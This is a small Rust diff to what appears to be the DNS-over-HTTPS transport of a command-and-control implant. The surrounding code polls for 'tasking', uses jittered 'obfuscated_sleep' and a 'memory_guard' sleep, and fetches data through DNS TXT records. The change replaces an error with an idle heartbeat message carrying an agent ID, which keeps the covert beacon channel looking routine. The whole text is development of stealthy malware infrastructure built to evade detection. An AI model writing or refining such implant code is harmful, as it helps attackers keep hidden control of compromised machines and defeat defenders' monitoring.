@@ -102,7 +102,14 @@ impl Transport for DohTransport {
         if !has_tasking {
             let sleep_dur = crate::obfuscated_sleep::calculate_jittered_sleep(&SleepConfig::default());
             crate::memory_guard::guarded_sleep(sleep_dur, None).await?;
-            return Err(anyhow!("No tasking available"));
+            return Ok(Message::Heartbeat {
+                timestamp: std::time::SystemTime::now()
+                    .duration_since(std::time::UNIX_EPOCH)
+                    .unwrap_or_default()
+                    .as_secs(),
+                agent_id: String::new(),
+                status: "idle".to_string(),
+            });
         }
 
         // Fetch actual data via TXT record
